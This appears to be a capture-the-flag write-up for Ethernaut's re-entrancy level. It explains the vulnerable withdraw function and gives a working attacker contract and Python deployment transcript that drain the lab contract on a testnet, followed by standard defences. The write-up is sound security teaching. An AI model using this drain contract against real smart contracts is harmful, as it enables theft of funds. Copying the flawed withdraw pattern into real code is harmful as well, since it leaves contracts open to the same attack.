# 10 - Re-entrancy

## Challenge

The goal of this level is for you to steal all the funds from the contract.

Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

## Summary

As hinted by title, this is the classic re-entrancy attack. [Solidity by Example](https://solidity-by-example.org/hacks/re-entrancy/) has a good summary of the bug. I will briefly explain the attack here.

The vulnerability happens here:

```js
function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value:_amount}("");
        if(result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
    }
}
```

Suppose attacker deploys an attack contract `A`. 

`A` has an `attack` function which does the following things:
- Calls `Reentrance.donate` to donate some ether to `Reentrance`.
- Calls `Reentrance.withdraw` to withdraw the ether. 

The `withdraw` function will call `A`'s fallback function, which is implemented intentionally such that it will call `Reentrance.withdraw` again. This will repeat until `Reentrance` runs out of ether. In this way, `A` can withdraw (a lot) more ether than it has donated. This is the basic idea of re-entrancy attack.

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '0x79Bd05D46270657F42150bde9B259649E39D207F'
```

First, we need to deploy the attack contract `A`. It needs an `attack` function and a fallback function. The fallback function will call `Reentrance.withdraw` again.

```js
> await getBalance(contract.address)
'0.001'
```

From this we come to know currently the balance is 0.001 ether, or 1000000000000000 wei. Withdraw amount should be equal to this.

```py
>>> abi, bytecode = compile_sol('''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _address) external payable;
    function withdraw(uint _amount) external;
}

contract Attack {
    IReentrance reentrance;
    uint amount;

    constructor(address _address) public {
        reentrance = IReentrance(_address);
        amount = 1_000_000_000_000_000;
    }

    // Fallback is called when Reentrance sends Ether to this contract.
    fallback() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(amount);
        }
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(amount);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
''',
solc_version="0.8.17",
base_path="Ethernaut/node_modules/"
)['Attack']
>>>
>>> contract = conn.contract(account, abi=abi, bytecode=bytecode)
>>> contract.deploy(contract_addr)
2023-06-14 22:10:14.076 | DEBUG    | cheb3.contract:deploy:94 - Deploying contract ...
2023-06-14 22:10:36.185 | INFO     | cheb3.contract:deploy:99 - The contract is deployed at 0x1beA1704b79d436c5CA00690A6bc130dC1456071
```

Call into `attack`:

```py
>>> contract.functions.attack().send_transaction(value=1000000000000000)
2023-06-14 22:12:34.782 | INFO     | cheb3.contract:send_transaction:236 - (0x1beA1704b79d436c5CA00690A6bc130dC1456071).attack transaction hash: 0xe0d5be2fe74d031354da5f6ca8d6520a28a1f4d3b7e17355bce416ff8d2ee47d
AttributeDict({'blockHash': HexBytes('0xa3f4bf4d6f3458e2127a336807a81772c5a7e8bdf2086e8f9f18407a92727962'), 'blockNumber': 9181233, 'contractAddress': None, 'cumulativeGasUsed': 8509595, 'effectiveGasPrice': 724, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 75786, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0x1beA1704b79d436c5CA00690A6bc130dC1456071', 'transactionHash': HexBytes('0xe0d5be2fe74d031354da5f6ca8d6520a28a1f4d3b7e17355bce416ff8d2ee47d'), 'transactionIndex': 58, 'type': 0})
```

We expect `Attack` to first withdraw 0.001 ether, then in its fallback withdraw another 0.001 ether. So the balance of `Reentrance` should be 0 after this.

Finally, submit the instance to pass the level.

## Afterword

In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that call will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.